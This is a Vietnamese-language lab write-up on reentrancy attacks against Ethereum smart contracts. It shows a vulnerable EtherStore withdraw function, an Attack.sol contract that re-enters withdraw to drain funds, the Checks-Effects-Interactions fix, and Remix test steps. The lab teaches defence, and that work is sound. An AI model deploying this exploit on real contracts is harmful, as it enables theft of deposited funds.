# Lab 1: Tấn Công Tái Nhập (Reentrancy Attack)

---

## 1. Giới thiệu lỗ hổng
**Reentrancy (Tái nhập)** là một trong những lỗ hổng kinh điển và nguy hiểm nhất trên mạng lưới Ethereum, từng gây ra vụ hack lịch sử **The DAO (2016)** làm thất thoát 3.6 triệu ETH và dẫn đến việc chia tách mạng lưới thành Ethereum (ETH) và Ethereum Classic (ETC).

Lỗ hổng xảy ra khi một hợp đồng thông minh gửi Ether tới một địa chỉ bên ngoài trước khi cập nhật số dư nội bộ của tài khoản đó. Kẻ tấn công có thể tạo một hợp đồng độc hại chứa hàm `fallback()` hoặc `receive()`, tự động gọi đệ quy ngược lại hàm rút tiền trước khi trạng thái số dư kịp cập nhật về 0.

```
+----------------+                       +---------------+
|  EtherStore    |                       |    Attack     |
+----------------+                       +---------------+
       |                                         |
       |  1. attack() -> deposit 1 ETH           |
       |<----------------------------------------|
       |  2. withdraw()                          |
       |<----------------------------------------|
       |  3. Call transfer 1 ETH                 |
       |---------------------------------------->|
       |                                         | 4. receive() triggered
       |  5. Re-enter withdraw() [Balance > 0]   |
       |<----------------------------------------|
       |  6. Call transfer 1 ETH                 |
       |---------------------------------------->|
       |         (Lặp lại cho đến khi cạn kiệt)  |
       |                                         |
       |  7. Update balances[attacker] = 0 (quá muộn!)
```

---

## 2. Phân tích mã nguồn

### Hợp đồng nạn nhân: `EtherStore.sol` (Chứa lỗi)
```solidity
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0, "No balance to withdraw");

    // LỖ HỔNG: Gửi tiền trước khi cập nhật số dư nội bộ
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    // Dòng này không kịp chạy trước khi bị gọi đệ quy
    balances[msg.sender] = 0;
}
```

### Hợp đồng tấn công: `Attack.sol`
```solidity
receive() external payable {
    if (address(etherStore).balance >= 1 ether) {
        etherStore.withdraw(); // Tái nhập hàm withdraw()
    }
}

function attack() external payable {
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw();
}
```

---

## 3. Biện pháp phòng chống: `EtherStoreSafe.sol`

Áp dụng mẫu thiết kế bảo mật tiêu chuẩn **Checks-Effects-Interactions**:
1. **Checks:** Kiểm tra mọi điều kiện hợp lệ đầu vào (`require(bal > 0)`).
2. **Effects:** Thay đổi tất cả các trạng thái nội bộ liên quan trước (`balances[msg.sender] = 0`).
3. **Interactions:** Thực hiện chuyển tiền hoặc tương tác với hợp đồng bên ngoài cuối cùng.

```solidity
function withdraw() public {
    uint bal = balances[msg.sender];
    
    // 1. Checks
    require(bal > 0, "No balance to withdraw");

    // 2. Effects (Cập nhật số dư về 0 trước)
    balances[msg.sender] = 0;

    // 3. Interactions (Gửi tiền sau)
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```

*Ngoài ra có thể sử dụng thêm Mutex Lock (ReentrancyGuard từ thư viện OpenZeppelin).*

---

## 4. Kịch bản thực nghiệm trên Remix IDE

1. **Khởi tạo:**
   - Deploy `EtherStore.sol` bằng Account 1 (Người dùng hợp lệ).
   - Account 1 & Account 2 lần lượt nạp (deposit) tiền vào `EtherStore`, tổng quỹ ví dụ: **15 ETH**.
2. **Khai thác:**
   - Chuyển sang Account 3 (Hacker), deploy `Attack.sol` với tham số là địa chỉ của `EtherStore`.
   - Hacker gọi hàm `attack()` kèm gửi giá trị `1 ETH`.
   - **Kết quả:** `Attack` rút thành công toàn bộ số dư 15 ETH của `EtherStore`.
3. **Kiểm tra bản vá:**
   - Deploy `EtherStoreSafe.sol` và nạp 15 ETH.
   - Hacker deploy lại `Attack.sol` trỏ tới `EtherStoreSafe`.
   - Hacker gọi `attack()` -> Giao dịch bị **Revert** ngay lập tức, tiền trong quỹ an toàn.
